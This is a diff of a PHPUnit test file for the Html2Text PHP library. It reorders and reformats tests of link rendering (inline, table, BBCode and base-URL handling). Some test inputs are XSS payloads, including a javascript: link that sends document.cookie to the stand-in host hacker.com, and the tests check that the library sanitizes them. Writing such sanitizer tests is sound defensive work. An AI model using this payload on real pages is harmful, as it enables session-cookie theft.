@@ -7,11 +7,11 @@ use voku\Html2Text\Html2Text;
 /**
  * Class LinkTest
  *
- * @package Html2Text
+ * @internal
  */
-class LinkTest extends \PHPUnit\Framework\TestCase
+final class LinkTest extends \PHPUnit\Framework\TestCase
 {
-  const TEST_HTML = '
+    const TEST_HTML = '
   <span>foo</span><a href="http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}">Link text</a><span>bar...</span>
   <br /><br />
   <a href="http://example.com">Link text</a>
@@ -19,9 +19,62 @@ class LinkTest extends \PHPUnit\Framework\TestCase
   <a href="mailto:fritz.eierschale@example.org">Fritz Eierschale, fritz.eierschale@example.org</a>
   ';
 
-  public function testDoLinksAfter()
-  {
-    $expected = <<<EOT
+    public function testBaseUrl()
+    {
+        $html = '<a href="/relative">Link text</a>';
+        $expected = 'Link text [http://example.com/relative]';
+
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
+        $html2text->setBaseUrl('http://example.com');
+
+        static::assertSame($expected, $html2text->getText());
+    }
+
+    public function testBaseUrlOld()
+    {
+        $html = '<a href="/relative">Link text</a>';
+        $expected = 'Link text [http://example.com/relative]';
+
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
+        $html2text->setBaseUrl('http://example.com');
+
+        static::assertSame($expected, $html2text->getText());
+    }
+
+    public function testBaseUrlWithPlaceholder()
+    {
+        $html = '<a href="/relative">Link text</a>';
+        $expected = 'Link text [%baseurl%/relative]';
+
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
+        $html2text->setBaseUrl('%baseurl%');
+
+        static::assertSame($expected, $html2text->getText());
+    }
+
+    public function testBoldLinks()
+    {
+        $html = '<b><a href="http://example.com">Link text</a></b>';
+        $expected = 'LINK TEXT [http://example.com]';
+
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
+
+        static::assertSame($expected, $html2text->getText());
+    }
+
+    public function testBrokenLink()
+    {
+        $html = '<ahref="#">Broken Link text</a>';
+        $expected = 'Broken Link text';
+
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
+
+        static::assertSame($expected, $html2text->getText());
+    }
+
+    public function testDoLinksAfter()
+    {
+        $expected = <<<EOT
 foo Link text [1] bar...
 
 Link text [2]
@@ -34,31 +87,15 @@ Links:
 [2] http://example.com
 EOT;
 
-    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'table']);
-    $output = $html2text->getText();
+        $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'table']);
+        $output = $html2text->getText();
 
-    self::assertSame($this->normalizeString($expected), $output);
-  }
+        static::assertSame($this->normalizeString($expected), $output);
+    }
 
-  public function testDoLinksInline()
-  {
-    $expected = <<<EOT
-foo Link text [http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}] bar...
-
-Link text [http://example.com]
-
-Fritz Eierschale, fritz.eierschale@example.org
-EOT;
-
-    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'inline']);
-    $output = $html2text->getText();
-
-    self::assertSame($this->normalizeString($expected), $output);
-  }
-
-  public function testDoLinksBBCode()
-  {
-    $expected = <<<EOT
+    public function testDoLinksBBCode()
+    {
+        $expected = <<<EOT
 foo [url=http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}]Link text[/url] bar...
 
 [url=http://example.com]Link text[/url]
@@ -66,49 +103,47 @@ foo [url=http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}]Link text[/u
 Fritz Eierschale, fritz.eierschale@example.org
 EOT;
 
-    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'bbcode']);
-    $output = $html2text->getText();
+        $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'bbcode']);
+        $output = $html2text->getText();
 
-    self::assertSame($this->normalizeString($expected), $output);
-  }
+        static::assertSame($this->normalizeString($expected), $output);
+    }
 
-  public function testDoLinksNone()
-  {
-    $expected = <<<EOT
-foo Link text bar...
+    public function testDoLinksInHtml()
+    {
+        $html = <<<EOT
+<p><a href="http://foo.com" class="_html2text_link_inline">Link text lall</a></p>
+<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
+<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
+<p><a href="http://example.com" class="_html2text_link_none">Link text</a></p>
+<p><a href="http://example.com" class="_html2text_link_inline">Link text</a></p>
+<p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
+EOT;
+
+        $expected = <<<EOT
+Link text lall [http://foo.com]
+
+Link text lall [http://lall.com]
+
+Link text lall [http://lall.com]
 
 Link text
 
-Fritz Eierschale, fritz.eierschale@example.org
-EOT;
-
-    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'none']);
-    $output = $html2text->getText();
-
-    self::assertSame($this->normalizeString($expected), $output);
-  }
-
-  public function testDoLinksNextline()
-  {
-    $expected = <<<EOT
-foo Link text
-[http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}] bar...
+Link text [http://example.com]
 
 Link text
 [http://example.com]
-
-Fritz Eierschale, fritz.eierschale@example.org
 EOT;
 
-    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'nextline']);
-    $output = $html2text->getText();
+        $html2text = new Html2Text($html);
+        $output = $html2text->getText();
 
-    self::assertSame($this->normalizeString($expected), $output);
-  }
+        static::assertSame($this->normalizeString($expected), $output);
+    }
 
-  public function testDoLinksInHtmlTable()
-  {
-    $html = <<<EOT
+    public function testDoLinksInHtmlTable()
+    {
+        $html = <<<EOT
 <p><a href="http://foo.com" class="_html2text_link_inline">Link text lall</a></p>
 <p><a href="http://lall.com" class="foo">Link text lall</a></p>
 <p><a href="http://lall.com" class="bar">Link text lall</a></p>
@@ -119,7 +154,7 @@ EOT;
 <p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
 EOT;
 
-    $expected = <<<EOT
+        $expected = <<<EOT
 Link text lall [http://foo.com]
 
 Link text lall [1]
@@ -142,69 +177,75 @@ Links:
 [1] http://lall.com
 EOT;
 
-    $html2text = new Html2Text($html, ['do_links' => 'table']);
-    $output = $html2text->getText();
+        $html2text = new Html2Text($html, ['do_links' => 'table']);
+        $output = $html2text->getText();
 
-    self::assertSame($this->normalizeString($expected), $output);
-  }
+        static::assertSame($this->normalizeString($expected), $output);
+    }
 
-  public function testDoLinksInHtml()
-  {
-    $html = <<<EOT
-<p><a href="http://foo.com" class="_html2text_link_inline">Link text lall</a></p>
-<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
-<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
-<p><a href="http://example.com" class="_html2text_link_none">Link text</a></p>
-<p><a href="http://example.com" class="_html2text_link_inline">Link text</a></p>
-<p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
-EOT;
-
-    $expected = <<<EOT
-Link text lall [http://foo.com]
-
-Link text lall [http://lall.com]
-
-Link text lall [http://lall.com]
-
-Link text
+    public function testDoLinksInline()
+    {
+        $expected = <<<EOT
+foo Link text [http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}] bar...
 
 Link text [http://example.com]
 
-Link text
-[http://example.com]
+Fritz Eierschale, fritz.eierschale@example.org
 EOT;
 
-    $html2text = new Html2Text($html);
-    $output = $html2text->getText();
+        $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'inline']);
+        $output = $html2text->getText();
 
-    self::assertSame($this->normalizeString($expected), $output);
-  }
+        static::assertSame($this->normalizeString($expected), $output);
+    }
 
-  public function testBaseUrl()
-  {
-    $html = '<a href="/relative">Link text</a>';
-    $expected = 'Link text [http://example.com/relative]';
+    public function testDoLinksNextline()
+    {
+        $expected = <<<EOT
+foo Link text
+[http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}] bar...
 
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
-    $html2text->setBaseUrl('http://example.com');
+Link text
+[http://example.com]
 
-    self::assertSame($expected, $html2text->getText());
-  }
+Fritz Eierschale, fritz.eierschale@example.org
+EOT;
 
-  public function testBaseUrlOld()
-  {
-    $html = '<a href="/relative">Link text</a>';
-    $expected = 'Link text [http://example.com/relative]';
+        $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'nextline']);
+        $output = $html2text->getText();
 
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
-    $html2text->setBaseUrl('http://example.com');
+        static::assertSame($this->normalizeString($expected), $output);
+    }
 
-    self::assertSame($expected, $html2text->getText());
-  }
+    public function testDoLinksNone()
+    {
+        $expected = <<<EOT
+foo Link text bar...
 
-  public function testIgnoredLinkTypes()
-  {
-    $html = '
+Link text
+
+Fritz Eierschale, fritz.eierschale@example.org
+EOT;
+
+        $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'none']);
+        $output = $html2text->getText();
+
+        static::assertSame($this->normalizeString($expected), $output);
+    }
+
+    public function testDoLinksWhenTargetInText()
+    {
+        $html = '<a href="http://example.com">http://example.com</a>';
+        $expected = 'http://example.com';
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
+        $html2text = new Html2Text($html, ['do_links' => 'nextline']);
+        static::assertSame($expected, $html2text->getText());
+    }
+
+    public function testIgnoredLinkTypes()
+    {
+        $html = '
     <a href="javascript:alert(\'XSS\')">XSS</a>
     <br />
     <a href="mailto:foo.bar@example.org">Foo Bar Example, foo.bar@example.org</a>
@@ -213,84 +254,43 @@ EOT;
     <br />
     <a href="/">Link text</a>
     ';
-    $expected = 'XSS
+        $expected = 'XSS
 Foo Bar Example, foo.bar@example.org
 Link text
 Link text [/]';
 
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
 
-    self::assertSame($this->normalizeString($expected), $html2text->getText());
-  }
+        static::assertSame($this->normalizeString($expected), $html2text->getText());
+    }
 
-  public function testBaseUrlWithPlaceholder()
-  {
-    $html = '<a href="/relative">Link text</a>';
-    $expected = 'Link text [%baseurl%/relative]';
+    public function testInvertedBoldLinks()
+    {
+        $html = '<a href="http://example.com"><b>Link text</b></a>';
+        $expected = 'LINK TEXT [http://example.com]';
 
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
-    $html2text->setBaseUrl('%baseurl%');
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
 
-    self::assertSame($expected, $html2text->getText());
-  }
+        static::assertSame($expected, $html2text->getText());
+    }
 
-  public function testBoldLinks()
-  {
-    $html = '<b><a href="http://example.com">Link text</a></b>';
-    $expected = 'LINK TEXT [http://example.com]';
+    public function testJavascriptSanitizing()
+    {
+        $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
+        $expected = 'Link text';
 
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
+        $html2text = new Html2Text($html, ['do_links' => 'inline']);
 
-    self::assertSame($expected, $html2text->getText());
-  }
+        static::assertSame($expected, $html2text->getText());
+    }
 
-  public function testInvertedBoldLinks()
-  {
-    $html = '<a href="http://example.com"><b>Link text</b></a>';
-    $expected = 'LINK TEXT [http://example.com]';
-
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
-
-    self::assertSame($expected, $html2text->getText());
-  }
-
-  public function testBrokenLink()
-  {
-    $html = '<ahref="#">Broken Link text</a>';
-    $expected = 'Broken Link text';
-
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
-
-    self::assertSame($expected, $html2text->getText());
-  }
-
-  public function testJavascriptSanitizing()
-  {
-    $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
-    $expected = 'Link text';
-
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
-
-    self::assertSame($expected, $html2text->getText());
-  }
-
-  public function testDoLinksWhenTargetInText()
-  {
-    $html = '<a href="http://example.com">http://example.com</a>';
-    $expected = 'http://example.com';
-    $html2text = new Html2Text($html, ['do_links' => 'inline']);
-    $this->assertEquals($expected, $html2text->getText());
-    $html2text = new Html2Text($html, ['do_links' => 'nextline']);
-    $this->assertEquals($expected, $html2text->getText());
-  }
-
-  /**
-   * @param string $string
-   *
-   * @return string
-   */
-  protected function normalizeString($string)
-  {
-    return str_replace(["\r\n", "\r"], "\n", $string);
-  }
+    /**
+     * @param string $string
+     *
+     * @return string
+     */
+    protected function normalizeString($string)
+    {
+        return \str_replace(["\r\n", "\r"], "\n", $string);
+    }
 }
